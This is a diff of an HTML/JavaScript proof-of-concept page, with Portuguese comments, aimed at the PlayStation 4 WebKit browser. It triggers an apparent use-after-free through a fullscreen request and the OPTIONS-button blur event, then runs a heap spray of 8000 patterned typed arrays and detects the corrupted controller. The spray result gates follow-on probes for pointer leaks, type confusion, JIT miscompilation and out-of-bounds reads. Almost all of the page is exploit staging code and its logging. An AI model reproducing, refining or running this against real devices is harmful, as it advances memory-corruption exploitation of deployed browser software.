@@ -1,18 +1,33 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="UTF-8">
-<title>PS4 WebKit – UAF Gated Bug Class Diagnostics</title>
-</head>
+<meta charset="utf-8">
+<title>PS4 WebKit – UAF Gated Bug-Class Diagnostics</title>
+
 <body>
-<button onclick="run()">RUN UAF DIAGNOSTICS</button>
+<h2>UAF-Gated Diagnostics</h2>
+
+<button onclick="armUAF()">ARMAR UAF (Fullscreen)</button>
+<button id="t1" onclick="testPointerLeak()" disabled>Teste 1: Pointer Leak</button>
+<button id="t2" onclick="testTypeConfusion()" disabled>Teste 2: Type Confusion</button>
+<button id="t3" onclick="testJIT()" disabled>Teste 3: JIT Miscompile</button>
+<button id="t4" onclick="testOOB()" disabled>Teste 4: OOB Escape</button>
+<button id="t5" onclick="testBoundary()" disabled>Teste 5: JS↔C++ Boundary</button>
+
 <pre id="log"></pre>
 
 <script>
 const log = s => document.getElementById("log").textContent += s + "\n";
+let UAF_CONFIRMED = false;
+let corrupted = null;
 
-function run() {
-    log("=== SETUP: Criando TypedArrays ===");
+function enableTests() {
+    ["t1","t2","t3","t4","t5"].forEach(id =>
+        document.getElementById(id).disabled = false
+    );
+}
+
+function armUAF() {
+    log("[*] Arming UAF – creating controllers");
 
     let controllers = [];
     const PATTERN = 2.121995791e-314; // 0x4141414141414141
@@ -23,11 +38,11 @@ function run() {
         controllers.push(a);
     }
 
-    log("[*] Arrays criados. Entrando em fullscreen...");
     document.documentElement.webkitRequestFullscreen();
+    log("[*] Fullscreen requested – press OPTIONS");
 
     window.onblur = function () {
-        log("[*] Blur detectado (OPTIONS). Iniciando spray...");
+        log("[*] onblur triggered (UAF window)");
 
         let spray = [];
         for (let i = 0; i < 8000; i++) {
@@ -35,122 +50,108 @@ function run() {
             s.fill(PATTERN);
             spray.push(s);
         }
+        log("[*] Spray complete");
 
-        let corrupted = null;
-        let idx = -1;
         for (let i = 0; i < controllers.length; i++) {
             if (controllers[i][0] === PATTERN) {
                 corrupted = controllers[i];
-                idx = i;
+                UAF_CONFIRMED = true;
+                log("[+] UAF CONFIRMED at controllers[" + i + "]");
                 break;
             }
         }
 
-        if (!corrupted) {
-            log("[-] UAF não confirmado nesta execução.");
+        if (!UAF_CONFIRMED) {
+            log("[-] UAF not detected");
             return;
         }
 
-        log("[+] UAF CONFIRMADO em controllers[" + idx + "]");
+        // === NEUTRALIZAÇÃO PARA EVITAR CRASH ===
+        try {
+            corrupted.fill(0);
+            log("[*] Corrupted array neutralized");
+        } catch {}
 
-        // ================================
-        // CRITICAL: Neutralizar estado
-        // ================================
-        corrupted.fill(0);
-        log("[*] Backing store neutralizado (anti-crash)");
-
-        // Rebuild DOM de forma segura
+        // DOM rewrite controlado (mantém o processo vivo)
         document.open();
-        document.write("<h3>UAF ativo – rodando diagnósticos</h3>");
+        document.write("<h3>UAF gated – diagnostics unlocked</h3>");
         document.close();
 
-        // ================================
-        // TESTES DE CLASSE DE BUG
-        // ================================
-        runDiagnostics();
+        enableTests();
+        log("[*] Diagnostic tests enabled");
     };
 }
 
-function runDiagnostics() {
-    log("\n=== DIAGNÓSTICOS DE CLASSE DE BUG ===");
-
-    testPointerLeak();
-    testTypeConfusion();
-    testJITSpeculation();
-    testOOB();
-    testBoundary();
-
-    log("\n=== FIM DOS TESTES ===");
-}
-
-/* ===================================================== */
-/* TESTE 1 – INFORMATION DISCLOSURE (LEAK)               */
-/* ===================================================== */
+/* ===========================
+   TESTE 1 — POINTER LEAK
+   =========================== */
 function testPointerLeak() {
-    log("\n[TEST 1] Pointer / Info Leak");
+    if (!UAF_CONFIRMED) return;
+    log("\n[TEST 1] Pointer Leak");
 
     try {
         let o = {};
-        let a = [o, o];
-        let s = JSON.stringify(a);
-        log("JSON.stringify: " + s);
-    } catch {}
+        let arr = [o, o, o];
+        log("JSON: " + JSON.stringify(arr));
+    } catch (e) {
+        log("JSON exception");
+    }
 
     try {
         let e = new Error("x");
-        log("Error.stack length: " + (e.stack ? e.stack.length : "null"));
+        log("Stack: " + e.stack);
     } catch {}
 
-    log("[RESULT] Se aparecer número tipo endereço → LEAK EXISTE");
+    log("[RESULT] Any numeric / address-like value = POSITIVE");
 }
 
-/* ===================================================== */
-/* TESTE 2 – TYPE CONFUSION                              */
-/* ===================================================== */
+/* ===========================
+   TESTE 2 — TYPE CONFUSION
+   =========================== */
 function testTypeConfusion() {
+    if (!UAF_CONFIRMED) return;
     log("\n[TEST 2] Type Confusion");
 
     function f(x) { return x.a; }
-
     let obj = { a: 13.37 };
     let ta = new Float64Array(4);
 
-    for (let i = 0; i < 10000; i++)
-        f(obj);
+    for (let i = 0; i < 10000; i++) f(obj);
 
     try {
         let r = f(ta);
-        log("Accessing TypedArray as object: " + r);
-        log("[!] SE r != undefined → CONFUSÃO");
+        log("Result f(typedArray): " + r);
+        if (r !== undefined)
+            log("[!] CONFUSION DETECTED");
     } catch (e) {
-        log("Exception (esperado): " + e.message);
+        log("Exception (expected)");
     }
 }
 
-/* ===================================================== */
-/* TESTE 3 – JIT MISCOMPILATION                          */
-/* ===================================================== */
-function testJITSpeculation() {
+/* ===========================
+   TESTE 3 — JIT MISCOMPILATION
+   =========================== */
+function testJIT() {
+    if (!UAF_CONFIRMED) return;
     log("\n[TEST 3] JIT Speculation");
 
     function g(x) { return x + 1; }
-
-    for (let i = 0; i < 200000; i++)
-        g(1);
+    for (let i = 0; i < 200000; i++) g(1);
 
     let r1 = g(1);
     let r2 = g("1");
 
     log("g(1)   = " + r1);
     log("g('1') = " + r2);
-    log("[!] Valores inconsistentes/crash → BUG JIT");
+    log("[RESULT] Any impossible value or crash = POSITIVE");
 }
 
-/* ===================================================== */
-/* TESTE 4 – OOB READ                                    */
-/* ===================================================== */
+/* ===========================
+   TESTE 4 — OOB ESCAPE
+   =========================== */
 function testOOB() {
-    log("\n[TEST 4] OOB Read");
+    if (!UAF_CONFIRMED) return;
+    log("\n[TEST 4] OOB Escape");
 
     let a = new Float64Array(4);
     a.fill(1.1);
@@ -158,32 +159,32 @@ function testOOB() {
     try {
         let v = a[100];
         log("a[100] = " + v);
-        log("[!] SE != undefined → OOB");
-    } catch (e) {
-        log("Exception (esperado)");
+        if (v !== undefined)
+            log("[!] OOB READ DETECTED");
+    } catch {
+        log("Exception (expected)");
     }
 }
 
-/* ===================================================== */
-/* TESTE 5 – JS ↔ C++ BOUNDARY                           */
-/* ===================================================== */
+/* ===========================
+   TESTE 5 — JS ↔ C++ BOUNDARY
+   =========================== */
 function testBoundary() {
+    if (!UAF_CONFIRMED) return;
     log("\n[TEST 5] JS ↔ C++ Boundary");
 
     try {
         let img = new Image();
         Object.defineProperty(img, "src", {
-            get() {
-                throw 13.37;
-            }
+            get() { throw 13.37; }
         });
         document.body.appendChild(img);
-        log("Image appended safely");
+        log("No crash");
     } catch (e) {
         log("Caught: " + e);
     }
 
-    log("[!] Crash aqui → bug de fronteira");
+    log("[RESULT] Crash or corruption = POSITIVE");
 }
 </script>
 </body>
